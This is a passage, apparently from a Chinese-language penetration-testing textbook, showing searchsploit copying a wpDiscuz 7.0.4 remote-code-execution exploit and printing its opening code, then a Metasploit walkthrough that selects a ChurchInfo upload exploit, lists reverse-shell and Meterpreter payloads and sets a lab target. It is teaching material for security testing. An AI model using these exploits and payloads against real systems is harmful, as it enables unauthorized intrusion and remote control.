
此命令会打开一个交互式文本窗口，我们可以在其中自行评估漏洞利用代码，以决定是否使用它。在粗略浏览代码并确定需要进一步调查后，我们可以按“q”键退出文本窗口。如需查看代码并在需要时添加修改，我们可以使用镜像（**-m** 开关）创建漏洞利用的本地副本。与之前的命令类似，下面的命令依赖于特定漏洞利用给出的路径。

```bash
searchsploit -m php/webapps/49967.py
```

```text
Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution
(Unauthenticated)
    URL: https://www.exploit-db.com/exploits/49967
    Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
File Type: Python script, Unicode text, UTF-8 text executable, with very
long lines (864)

Copied to: /home/chris/49967.py
```

请注意，该漏洞利用已被复制到当前工作目录，在本示例中即主目录。复制到我们的目录后，我们可以用 vim 或 nano 等工具打开它，继续审查代码。审查该漏洞利用代码可以发现，它分别通过 **-u** 和 **-p** 开关请求 URL 和路径。之后，它似乎在提交带有 PHP 载荷的漏洞利用之前收集环境信息。

```python
# Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
# Date: 2021/06/08
# Exploit Author: Fellipe oliveira
# Vendor Homepage: https://gvectors.com/
# Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip
# Version: wpDiscuz 7.0.4
# Tested on: Debian9, Windows 7, Windows 10 (Wordpress 5.7.2)
# CVE : CVE-2020-24186
# Thanks for the great contribution to the code: Z3r0c00l (https://twitter.com/zeroc00l)

#!/bin/python3

import requests
import optparse
import re
import random
import time
import string
import json

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target host: http://192.168.1.81/blog/")
parser.add_option('-p', '--path', action="store", dest="path", help="Path to exploitation: /2021/06/blogpost")

options, args = parser.parse_args()

if not options.url or not options.path:
    print('[+] Specify an url target')
```

**图 6.3** 审查漏洞利用代码，以识别可能发生的活动以及预期结果。

![](img/181571ad74cba0e6a2f38fcd2658651e_182_0.png)

**图 6.4** 使用 banner 启动 Metasploit。

## 选择漏洞利用模块

当 **msfconsole** 窗口出现后，我们可以使用 **search** 命令搜索特定漏洞利用。在此示例中，我们将搜索名为 ChurchInfo 的程序，以确定是否有可用模块。此实例中要运行的命令是 **search churchinfo**，它会返回一个模块。

![](img/181571ad74cba0e6a2f38fcd2658651e_182_1.png)

**图 6.5** 搜索 ChurchInfo 显示有一个模块可用。

要使用通过搜索功能识别出的漏洞利用，我们可以复制并粘贴模块名称，并使用“use”命令将其选中，例如 **use exploit/multi/http/churchinfo_upload_exec**。正如 Metasploit 返回的信息中所指出的，我们也可以从搜索窗口中选择一个模块，并使用其编号来使用它——这比输入模块完整名称要快得多、简单得多。相反，我们可以只需在“use”命令中提供模块编号，例如 **use 0**，这会从搜索结果中选择编号为 0 的模块。

在查看此信息时，我们可以看到该模块需要对系统进行经过身份验证的访问。通过身份验证后，模块会在应用程序中创建一封草稿邮件，为电子邮件上传附件，而漏洞就在于服务器如何存储该附件。如需更详细的文档，运行 **info -d** 命令会以 markdown 格式打开该模块的适用文档。该文档包含如何安装应用程序、如何配置应用程序，以及如何证明该漏洞能够被该模块有效利用。

![](img/181571ad74cba0e6a2f38fcd2658651e_184_0.png)

**图 6.8** 可通过 info -d 命令获取的详细 markdown 模块文档。

msf6 exploit(multi/http/churchinfo_upload_exec) > show payloads

兼容的载荷

| # | 名称 | 披露日期 | 排名 | 检查 | 描述 |
|---|------|-----------------|------|-------|-------------|
| 0 | payload/generic/custom | | 普通 | 否 | 自定义载荷 |
| 1 | payload/generic/shell_bind_tcp | | 普通 | 否 | 通用命令 Shell，内联 TCP 绑定 |
| 2 | payload/generic/shell_reverse_tcp | | 普通 | 否 | 通用命令 Shell，内联反向 TCP |
| 3 | payload/generic/shell_internet | | 普通 | 否 | 通用命令 Shell，反向 TCP 连接 |
| 4 | payload/multi/meterpreter/reverse_http | | 普通 | 否 | 与体系结构无关的 Meterpreter 阶段，反向 HTTP |
| 5 | payload/multi/meterpreter/reverse_https | | 普通 | 否 | 与体系结构无关的 Meterpreter 阶段，反向 HTTPS |
| 6 | payload/php/bind_perl | | 普通 | 否 | PHP 命令 Shell，通过 Perl 绑定 TCP |
| 7 | payload/php/bind_php_ipv6 | | 普通 | 否 | PHP 命令 Shell，通过 PHP 绑定 TCP IPv6 |
| 8 | payload/php/bind_php | | 普通 | 否 | PHP 命令 Shell，通过 PHP 绑定 TCP |
| 9 | payload/php/bind_php_ipv6 | | 普通 | 否 | PHP 命令 Shell，通过 php 绑定 TCP IPv6 |
| 10 | payload/php/download_exec | | 普通 | 否 | PHP 可执行文件下载并执行 |
| 11 | payload/php/exec | | 普通 | 否 | PHP 执行命令 |
| 12 | payload/php/meterpreter/bind_tcp | | 普通 | 否 | PHP Meterpreter，绑定 TCP 存根 |
| 13 | payload/php/meterpreter/bind_tcp_ipv6 | | 普通 | 否 | PHP Meterpreter，绑定 TCP 存根 IPv6 |
| 14 | payload/php/meterpreter/bind_tcp_uuid | | 普通 | 否 | PHP Meterpreter，支持 UUID 的绑定 TCP 存根 IPv6 |
| 15 | payload/php/meterpreter/bind_tcp_uuid | | 普通 | 否 | PHP Meterpreter，支持 UUID 的绑定 TCP 存根 |
| 16 | payload/php/meterpreter/reverse_tcp | | 普通 | 否 | PHP Meterpreter，PHP 反向 TCP 存根 |
| 17 | payload/php/meterpreter/reverse_tcp_uuid | | 普通 | 否 | PHP Meterpreter，反向 TCP 存根 |
| 18 | payload/php/reverse_perl | | 普通 | 否 | PHP 命令 Shell，通过 Perl 反向 TCP 连接 |
| 19 | payload/php/reverse_php | | 普通 | 否 | PHP 命令 Shell，通过 PHP 反向 TCP |

**图 6.10** 使用“show payloads”命令列出漏洞利用的所有兼容载荷。

与选择漏洞利用类似，我们可以根据列表窗口中的编号选择载荷。要选择不同的载荷，使用的命令是 **set payload 11**，这将从上面发布的示例中选择 **payload/php/exec**。目前，我们仍将载荷设置为 Meterpreter，因为它具有灵活性和模块化性。

选择漏洞利用和载荷后，我们需要输入模块使用的选项。选项可能内置了默认值，我们需要确保为所有必需选项提供值。再次查看 **options** 命令，我们可以看到有少数必需选项，但大多数似乎已经有一些关联值。然而，有一个必需的值为未设置，即 **RHOSTS**，它用于选择远程主机（即易受攻击应用程序的目标）。要为选项设置值，请使用语法 **set <KEY> <VALUE>**，例如 **set rhosts 192.168.1.72**。这将在选项中设置该值，并将其用作模块的目标。请注意，使用 **setg** 命令（其中“g”代表全局）可以在当前 Metasploit 会话中跨所有模块设置此值。

msf6 exploit(multi/http/churchinfo_upload_exec) > set rhosts 192.168.1.72
rhosts => 192.168.1.72
msf6 exploit(multi/http/churchinfo_upload_exec) > options

模块选项 (exploit/multi/http/churchinfo_upload_exec):

| 名称 | 当前设置 | 必需 | 描述 |
|------|-----------------|----------|-------------|
| EMAIL_MSG | Hello there! | 是 | Web 应用中的电子邮件消息 |
| EMAIL_SUBJ | Read this now! | 是 | Web 应用中的电子邮件主题 |
| PASSWORD | churchinfoadmin | 是 | 用于登录的密码 |
| PROXIES | | 否 | 格式为 type:host 的代理链 |
| RHOSTS | 192.168.1.72 | 是 | 目标主机，参见 https://... |
| RPORT | 80 | 是 | 目标端口（TCP） |
| SSL | false | 否 | 为出站连接协商 SSL/TLS |
| TARGETURI | /churchinfo/ | 是 | ChurchInfo 应用程序的位置 |
| USERNAME | admin | 是 | ChurchInfo 应用程序的用户名 |
| VHOST | | 否 | HTTP 服务器虚拟主机 |

**图 6.11** 在漏洞利用模块上设置 RHOSTS 键的值。

与设置漏洞利用模块的选项类似，我们可以使用相同的语法来更改载荷模块。为了使反向 TCP 载荷生效，我们将在我们的
